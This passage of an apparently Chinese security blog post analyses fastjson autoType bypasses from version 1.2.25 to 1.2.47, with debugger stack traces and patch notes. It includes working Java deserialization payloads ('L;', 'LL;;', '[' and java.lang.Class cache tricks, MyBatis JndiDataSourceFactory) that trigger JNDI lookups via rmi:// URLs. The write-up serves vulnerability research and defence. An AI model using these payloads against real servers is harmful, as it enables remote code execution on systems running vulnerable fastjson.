src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717888684-0a64b119-f142-4a87-b20c-faa93e50245f.png"><br>开启autoTypeSupport的方法</p><ul><li>JVM启动参数：-Dfastjson.parser.autoTypeSupport&#x3D;true</li><li>代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</li></ul><p>acceptList添加方法</p><ul><li>JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;com.xx.a.,com.yy.</li><li>代码中设置：ParserConfig.getGlobalInstance().addAccept(“com.xx.a”);</li><li>配置文件配置：在1.2.25&#x2F;26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：fastjson.parser.autoTypeAccept&#x3D;com.taobao.pac.client.sdk.dataobject.,com.cainiao.</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>把@type对应的值改成：”L类名;”，如下面的exp所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.41</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>按照exp的绕过方法，肯定是能过denyList的，问题是为什么那样写类名也能加载到，需要分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1074, TypeUtils</span><br><span class="line">checkAutoType:861, ParserConfig</span><br><span class="line">parseObject:322, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:8, Test2</span><br></pre></td></tr></table></figure><p>从下面可以看到，如果类名以”L”开头、以”;”结尾，就会trim掉首尾的字符，然后<strong>递归调用loadClass。</strong><br>所以这种绕过方法是能加载到类的，也就能正常执行exp了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698738981491-d537178e-29e0-44cf-92a7-b3eceaefe83a.png" alt="image.png"></p><h1 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h1><h2 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>fastjson版本换到1.2.42，再次运行上面的exp，发现抛出异常了，检测到了上面那种类名写法。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698741593872-0a380d67-9006-453d-9996-57d06b6c5425.png" alt="image.png"><br>被检测的到的原因，是开发人员在checkAutoType里，检测到前”L”后”;”的类名，就提前trim一次。<br>另外，为了提高挖洞门槛，把denyList改成hash值了，不过github已经有<a href="https://github.com/LeadroyaL/fastjson-blacklist">项目</a>跑出来了大部分黑名单类名。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742254326-a6235a77-e215-4f46-9daf-68504a33f1f8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742295676-8f87c893-ebda-4c6f-adcf-46825313086d.png" alt="image.png"></p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p>把@type对应的值改成：”LL类名;;”，即经典双写绕过，如下面的exp所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.42</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h2><p>这里问题在于它提前trim了一下我们的类名，但是实际上在后面的TypeUtils#loadClass里也会trim我们的类名，而且是递归trim，很容易想到双写绕过黑名单。<br>首先，在ParserConfig#checkAutoType里trim一下我们的类名，由于这里双写 ，可以过黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:906, ParserConfig</span><br><span class="line">parseObject:311, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742671061-892d31eb-edcf-466c-97f4-9a1054ca50cb.png" alt="image.png"><br>然后，我们进到TypeUtils#loadClass里，这里会递归trim我们的类名，最后加载到我们的类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1131, TypeUtils [3]</span><br><span class="line">loadClass:1127, TypeUtils</span><br><span class="line">loadClass:1144, TypeUtils [2]</span><br><span class="line">loadClass:1127, TypeUtils</span><br><span class="line">loadClass:1144, TypeUtils [1]</span><br><span class="line">checkAutoType:975, ParserConfig</span><br><span class="line">parseObject:311, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742892048-e05e79dc-4787-48fe-a561-02a766cbe790.png" alt="image.png"></p><h1 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h1><h2 id="补丁分析-2"><a href="#补丁分析-2" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>运行上个exp，报错，双写也被识别到了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743073506-9a513a40-2c3b-40ac-bc61-1d8f45996c5f.png" alt="image.png"><br>ParserConfig#checkAutoType下断点调试，看看怎么个事。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743639941-33ddd478-84c1-4147-8283-d6697f1802a5.png" alt="image.png"><br>发现多加了一层IF，判断类名前两个字符是不是”L”，是的话直接抛异常，这样双写肯定就失效了。</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>之前加”L;”的方法无法使用，但是还有加”[“的方法，这是看TypeUtils#loadClass里处理类名的逻辑，自然想到的绕过方法，具体payload为什么是这样，看<strong>调试分析</strong>部分。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.43</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h2><p>首先，我们看TypeUtils#loadClass，这里显示如果第一个字符是”[“，就trim掉，然后再执行loadClass，这是我们所希望的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750115778-9544d540-76ae-481b-8de6-12b1f83eace5.png" alt="image.png"><br>于是我们构造payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>调试分析，发现会抛出异常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">parseArray:675, DefaultJSONParser</span><br><span class="line">deserialze:183, ObjectArrayCodec</span><br><span class="line">parseObject:373, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:10, Test4</span><br></pre></td></tr></table></figure><p>提示代码期待在指定位置”,”前面，加上”[“符号。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750540577-417e8113-7cae-400b-87bf-157dc1928e47.png" alt="image.png"><br>于是我们改进payload如下，加上”[“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>再次抛出异常，提示我们在指定位置加上”{“符合。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750783181-80234dfa-4312-4646-8af5-08d8dfac3c85.png" alt="image.png"><br>于是我们再改进Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>成功执行命令。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750971771-b5591e83-9bae-43d8-b3a5-03d6786f6a92.png" alt="image.png"></p><h1 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h1><h2 id="补丁分析-3"><a href="#补丁分析-3" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>运行上面的exp，会抛出异常，”[“的绕过方式也被检测到了<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751620126-5769e711-7bd5-4fb3-af05-f324f2792e50.png" alt="image.png"><br>开发者在ParserConfig#checkAutoType又加了校验，如果类名开头是”[“直接抛出异常<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751825640-0d6820b6-fbbe-485c-9895-3b0268173a82.png" alt="image.png"></p><h2 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h2><p>利用mybatis的依赖里的类，去打Mybatis里的JNDI注入，因为JndiDataSourceFactory不在黑名单里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.45</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>需要目标服务端存在mybatis的jar包，版本要求：3.x.x&lt;Version&lt;3.5.0，也存在一些限制。</p><h2 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h2><p>JndiDataSourceFactory本来就不在黑名单里，自然就bypass了，这里只看一眼JNDI的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setProperties:44, JndiDataSourceFactory</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory</span><br><span class="line">deserialze:267, JavaBeanDeserializer</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test5</span><br></pre></td></tr></table></figure><p>JndiDataSourceFactory#setProperties存在JNDI注入，和JdbcRowSetImpl链子基本一样，不再分析。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698753142868-78aa3c22-d35c-4f9a-9030-99737647af46.png" alt="image.png"></p><h1 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25-1.2.47"></a>1.2.25-1.2.47</h1><p>和之前的绕过思路不同，本质是利用java.lang.Class内置类将恶意类加载进缓存，然后再使用fastjson反序列化去加载这个恶意类时，就会走缓存而不会走黑名单校验，进而成功bypass。</p><h2 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.47</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h2><p><strong>不需要设置AutoTypeSupport，大大提高了可利用性！</strong><br>下面是对Exp的影响，简单知道结论即可，无非是不同版本的checkAutoType里的逻辑有细微差别。</p><ul><li>不开启AutoTypeSupport：1.2.25-1.2.47通杀</li><li>开启AutoTypeSupport：1.2.25-1.2.32报错，1.2.33-1.2.47打通</li></ul><h2 id="调试分析-4"><a href="#调试分析-4" class="headerlink" title="调试分析"></a>调试分析</h2><p>这里默认不开启AutoTypeSupport，版本采用fastjson 1.2.47。<br>首先，在DefaultJSONParser#parseObject里解析JSON字符串，解析到第一个key是”a”，当检查到下一个字符是”{“的时候，程序认为a的值是一个对象，于是递归调用parseObject函数去解析这个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770139713-0b121b72-5cbe-4ece-b9ab-28e669fe6907.png" alt="image.png"><br>然后，继续解析又发现对象的key为”@type”，先调用checkAutoType()对传入的类名做检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770252631-4cf12606-07b4-42e9-92da-3c3be5ff6c36.png" alt="image.png"><br>显然可过检测，java.lang.Class是可以在HashMap里直接找到的，通过findClass直接加载到，不走黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:901, ParserConfig</span><br><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770549079-a7405030-6f34-4993-b522-2174c04fe139.png" alt="image.png"><br>于是加载到java.lang.Class对象并返回，下面就以类型为java.lang.Class为前提，对JSON字符串反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:384, DefaultJSONParser [2]</span><br><span class="line">parseObject:544, DefaultJSONParser [1]</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770901140-a93fb0f3-e0ba-40ed-85e1-2def8daf9f80.png" alt="image.png"><br>java.lang.Class默认调用MiscCodec#deserialze，它要求传入的JSON字符串的key&#x3D;”val”，不然抛异常；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserialze:227, MiscCodec</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771019637-d465aa1b-b99b-42d8-be01-4b2a062031fe.png" alt="image.png"><br>这也是payload为什么设置key为”val”的原因，如果key&#x3D;”val”的话，获取key的value，存入objVal&#x2F;strVal<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771218994-927e40d4-50fc-49c6-b567-109923a3f4ea.png" alt="image.png"><br>再调用TypeUtils#loadClass，加载key的value对应的类并返回，对应exp就是加载JdbcRowSetImpl对象并返回<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698771618187-1ebf6032-7321-4c9e-90db-6a2569b671c5.png" alt="image.png"><br>到这里，实际上我们就已经达成了加载JdbcRowSetImpl类的目的，此时会在缓存mappings里存一份映射关系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1242, TypeUtils</span><br><span class="line">loadClass:1206, TypeUtils</span><br><span class="line">deserialze:335, MiscCodec</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698773169563-8ef49b85-8255-4c14-a61f-4c09a543679e.png" alt="image.png"><br>接下来就是类似的，解析”b”的值是个对象，然后又发现里边的key&#x3D;”@type”，走进checkAutoType里，但是这次它可以在mappings里找到JdbcRowSetImpl这个类，因为前面有缓存，直接在这返回，不走下面的黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getClassFromMapping:1202, TypeUtils</span><br><span class="line">checkAutoType:949, ParserConfig</span><br><span class="line">parseObject:316, DefaultJSONParser</span><br><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698772581287-ec1ff9d6-5155-4356-b9a4-fb8cfb0a956a.png" alt="image.png"><br>至此，如图已绕过checkAutoType，加载到JdbcRowSetImpl这个类，后续利用JdbcRowSetImpl不再分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parseObject:319, DefaultJSONParser [2]</span><br><span class="line">parseObject:544, DefaultJSONParser [1]</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, 